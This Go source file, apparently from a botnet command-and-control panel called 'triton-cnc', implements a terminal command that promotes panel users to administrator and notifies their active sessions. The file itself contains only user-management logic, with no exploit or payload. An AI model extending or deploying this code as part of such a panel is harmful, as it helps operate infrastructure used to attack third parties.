package users_edit

import (
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/sessions"
	"strconv"
	"strings"
)


func MakeAdmin(sessionss *sessions.Session_Store, cmd []string) {

	if len(cmd) <= 2 {
		sessionss.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+" users                                               Array method is functional\r\n"))
		sessionss.Channel.Write([]byte(" users admin=true                           Upgrade's a users permission levels\r\n"))
		sessionss.Channel.Write([]byte(" users admin=true [username's]    Upgrades a multiply users to admin permssions\r\n"))
		sessionss.Channel.Write([]byte(" users admin=true [username's] -m [msg...]     same as last one but sends a msg\r\n"))
		return
	}

	var SessionsActive []*sessions.Session_Store; var PassedSplit bool = false; var Message string; var Promotions []bool

	for LenCon := 2; LenCon < len(cmd); LenCon++ {

		if PassedSplit {
			Message += cmd[LenCon] + " "
			continue
		}

		if strings.Contains(cmd[LenCon], "-m") {
			PassedSplit = true
			continue
		}

		User, boolen := database.GetUser(cmd[LenCon])
		if boolen != nil || User == nil {
			sessionss.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"User `"+cmd[LenCon]+"` has failed to be found in the database \r\n"))
			continue
		}

		if User.Administrator {
			sessionss.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"User `"+cmd[LenCon]+"` is already an admin \r\n"))
			continue
		}

		error := database.EditFeild(cmd[LenCon], "Admin", "1")
		if !error {
			sessionss.Channel.Write([]byte("\x1b"+build.Config.Extra.DefaultColours+"User `"+cmd[LenCon]+"` has failed to be updated to administrator\r\n"))
			continue
		} else {
			Promotions = append(Promotions, true)
		}

		SessionsActive = append(SessionsActive, GetUser(cmd[LenCon])...)

		continue
	}

	for _, s := range SessionsActive {
		s.User.Administrator = true
		if PassedSplit {
			go s.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[38;5;2m"+Message+"\x1b[0m\x1b[38;5;15m\x1b8"))
		} else {
			go s.Channel.Write([]byte("\x1b[0m\x1b7\x1b[1A\r\x1b[2K \x1b[38;5;2mYou have been promoted to admin by an moderator\x1b[0m\x1b[38;5;15m\x1b8"))
		}
	}

	sessionss.Channel.Write([]byte("\x1b[38;5;11m Correctly promoted "+strconv.Itoa(len(Promotions))+" users to admin status\r\n"))
	return
}
